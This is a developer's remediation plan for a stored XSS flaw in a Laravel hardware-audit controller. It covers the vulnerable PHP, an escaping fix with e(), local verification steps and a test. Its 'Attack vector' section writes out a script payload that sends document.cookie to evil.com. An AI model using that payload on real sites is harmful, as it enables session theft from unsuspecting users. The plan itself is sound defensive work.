# Plan 012: Fix Stored XSS in Hardware Audit Diff HTML

**Created:** 2026-09-02  
**Branch:** tannaz  
**Planned at:** cf3cf9c  
**Priority:** Critical  
**Category:** Security  

## Problem

The `buildDiffSummary()` method in `HardwareAuditController` constructs raw HTML using unescaped database values. If a hardware field contains malicious HTML/JavaScript (e.g., `<script>alert('xss')</script>`), it will be rendered as-is in the audit API response and any frontend that displays it.

## Current State

**File:** `app/Http/Controllers/Api/HardwareAuditController.php:344-352`

```php
protected function buildDiffSummary(array $changes): array
{
    $summary = [];
    foreach ($changes as $change) {
        $summary[] = "فیلد <strong>{$change['field']}</strong>: از <span class='text-error'>{$change['old']}</span> به <span class='text-success'>{$change['new']}</span> تغییر یافت.";
    }

    return $summary;
}
```

- `$change['field']` — field name from DB
- `$change['old']` — old value from DB
- `$change['new']` — new value from DB

All three values are injected directly into HTML without escaping.

**Attack vector:** A user with hardware edit access stores a malicious value like:
```
<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>
```

When another user views the audit diff, the script executes.

## Proposed Fix

Use Laravel's `e()` helper (which calls `htmlspecialchars()` with `ENT_QUOTES`) to escape all dynamic values:

```php
protected function buildDiffSummary(array $changes): array
{
    $summary = [];
    foreach ($changes as $change) {
        $field = e($change['field']);
        $old = e($change['old']);
        $new = e($change['new']);
        $summary[] = "فیلد <strong>{$field}</strong>: از <span class='text-error'>{$old}</span> به <span class='text-success'>{$new}</span> تغییر یافت.";
    }

    return $summary;
}
```

**Why `e()` and not `strip_tags()`:** `e()` preserves the HTML structure (the `<strong>` and `<span>` tags) while escaping only the dynamic values. `strip_tags()` would remove all HTML, breaking the formatting.

## Files to Modify

| File | Line | Change |
|------|------|--------|
| `app/Http/Controllers/Api/HardwareAuditController.php` | 348 | Wrap `$change['field']`, `$change['old']`, `$change['new']` in `e()` |

**Out of scope:** The `formatValueForDisplay()` method (which formats values for display), other API controllers.

## Verification

```bash
# 1. Create a hardware record with XSS payload
php scripts/boost_tool.php query '{"sql": "UPDATE hardware SET ram = '\''<script>alert(1)</script>'\'' WHERE id = 1 LIMIT 1"}'

# 2. Check audit API response
curl http://localhost:8000/api/hardware/audit/1 \
  -H "Authorization: Bearer <token>" | jq '.summary'
# Expected: HTML-escaped output, NOT raw <script> tag

# 3. Run hardware tests
composer test -- --filter="hardware|audit"
# Expected: all pass

# 4. Clean up test data
php scripts/boost_tool.php query '{"sql": "UPDATE hardware SET ram = '\''8'\'' WHERE ram = '\''<script>alert(1)</script>'\''"}'
```

## Test Plan

```php
it('escapes HTML in audit diff summary', function () {
    $user = User::factory()->create();
    $hardware = Hardware::factory()->create(['ram' => 'normal_value']);
    
    // Update with XSS payload
    $hardware->update(['ram' => '<script>alert("xss")</script>']);
    
    // Trigger audit log creation (or manually create one)
    $audit = HardwareAudit::factory()->create([
        'hardware_id' => $hardware->id,
        'changes' => [
            ['field' => 'ram', 'old' => 'normal_value', 'new' => '<script>alert("xss")</script>'],
        ],
    ]);

    $response = $this->actingAs($user)
        ->getJson("/api/hardware/audit/{$audit->id}");

    $response->assertOk();
    $summary = $response->json('data.summary.0');
    
    expect($summary)->not->toContain('<script>')
        ->and($summary)->toContain('&lt;script&gt;');
});
```

## STOP Conditions

- If `buildDiffSummary()` is called from multiple places (grep for callers)
- If the frontend expects unescaped HTML (unlikely but verify)
- If `$change['old']` or `$change['new']` can be non-string types

## Risk Assessment

| Risk | Impact | Mitigation |
|------|--------|------------|
| Frontend double-escapes | Shows `&amp;lt;` instead of `<` | Test rendering in browser after fix |
| Non-string values passed to e() | Type error | Cast to string first: `e((string) $change['old'])` |
| Existing XSS payloads in DB | Data already compromised | Audit DB for existing malicious values post-fix |

## Maintenance Notes

- Apply the same `e()` escaping to any other method that builds HTML from DB values
- Consider using Blade `{{ }}` templating for audit views instead of raw PHP string concatenation
- Add a CSP (Content-Security-Policy) header as defense-in-depth
